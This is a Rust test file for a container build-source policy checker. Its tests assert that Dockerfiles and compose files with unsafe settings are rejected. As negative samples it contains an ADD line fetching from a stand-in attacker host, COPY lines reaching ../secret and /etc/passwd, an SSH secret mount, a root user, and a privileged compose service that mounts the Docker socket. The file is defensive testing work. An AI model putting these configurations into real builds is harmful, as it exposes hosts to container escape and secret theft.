#![forbid(unsafe_code)]

use std::collections::BTreeMap;

use vonk_agent::source_policy::inspect_build_source;

fn files(dockerfile: &str) -> BTreeMap<String, Vec<u8>> {
    BTreeMap::from([("Dockerfile".to_owned(), dockerfile.as_bytes().to_vec())])
}

#[test]
fn agent_accepts_a_pinned_non_root_dockerfile() {
    let report = inspect_build_source(
        &files(&format!(
            "FROM ghcr.io/vonkforge/vllm@sha256:{}\nCOPY mods/ /opt/vonk/mods/\nUSER 10001:10001\n",
            "a".repeat(64)
        )),
        "Dockerfile",
    );

    assert!(report.passed, "{:?}", report.findings);
}

#[test]
fn agent_accepts_an_absolute_copy_source_from_a_named_stage() {
    let report = inspect_build_source(
        &files(&format!(
            "FROM docker.io/library/busybox@sha256:{} AS tools\nFROM ghcr.io/vonkforge/runtime@sha256:{}\nCOPY --from=tools /bin/busybox /opt/vonk/busybox\nUSER 10001:10001\n",
            "a".repeat(64),
            "b".repeat(64),
        )),
        "Dockerfile",
    );

    assert!(report.passed, "{:?}", report.findings);
}

#[test]
fn agent_rejects_dockerfile_escape_and_build_privilege() {
    for (dockerfile, code) in [
        (
            "FROM ubuntu:latest\nUSER 10001\n",
            "dockerfile.base_unpinned",
        ),
        (
            &format!("FROM ubuntu@sha256:{}\nUSER 10001\n", "0".repeat(64)),
            "dockerfile.base_placeholder",
        ),
        (
            &format!(
                "FROM ubuntu@sha256:{}\nADD https://evil.invalid/x /x\nUSER 10001\n",
                "a".repeat(64)
            ),
            "dockerfile.add_forbidden",
        ),
        (
            &format!(
                "FROM ubuntu@sha256:{}\nRUN --mount=type=ssh true\nUSER 10001\n",
                "a".repeat(64)
            ),
            "dockerfile.secret_mount",
        ),
        (
            &format!(
                "FROM ubuntu@sha256:{}\nCOPY ../secret /x\nUSER 10001\n",
                "a".repeat(64)
            ),
            "dockerfile.copy_escape",
        ),
        (
            &format!(
                "FROM ubuntu@sha256:{}\nCOPY /etc/passwd /x\nUSER 10001\n",
                "a".repeat(64)
            ),
            "dockerfile.copy_escape",
        ),
        (
            &format!("FROM ubuntu@sha256:{}\nUSER root\n", "a".repeat(64)),
            "dockerfile.root_user",
        ),
    ] {
        let report = inspect_build_source(&files(dockerfile), "Dockerfile");
        assert!(
            report.findings.iter().any(|item| item.code == code),
            "{code}: {:?}",
            report.findings
        );
    }
}

#[test]
fn agent_rejects_privileged_compose_even_when_dockerfile_is_safe() {
    let mut source = files(&format!(
        "FROM ghcr.io/vonkforge/vllm@sha256:{}\nUSER 10001\n",
        "a".repeat(64)
    ));
    source.insert(
        "compose.yaml".to_owned(),
        br#"services:
  model:
    build: .
    privileged: true
    network_mode: host
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
"#
        .to_vec(),
    );

    let report = inspect_build_source(&source, "Dockerfile");
    let codes = report
        .findings
        .iter()
        .map(|item| item.code)
        .collect::<Vec<_>>();
    assert!(codes.contains(&"compose.privileged"));
    assert!(codes.contains(&"compose.host_namespace"));
    assert!(codes.contains(&"compose.host_bind"));
    assert!(codes.contains(&"compose.container_socket"));
}

#[test]
fn malformed_compose_fails_closed() {
    let mut source = files(&format!(
        "FROM ghcr.io/vonkforge/vllm@sha256:{}\nUSER 10001\n",
        "a".repeat(64)
    ));
    source.insert("docker-compose.yml".to_owned(), b"services: [".to_vec());

    let report = inspect_build_source(&source, "Dockerfile");
    assert_eq!(report.findings.last().unwrap().code, "compose.invalid");
}
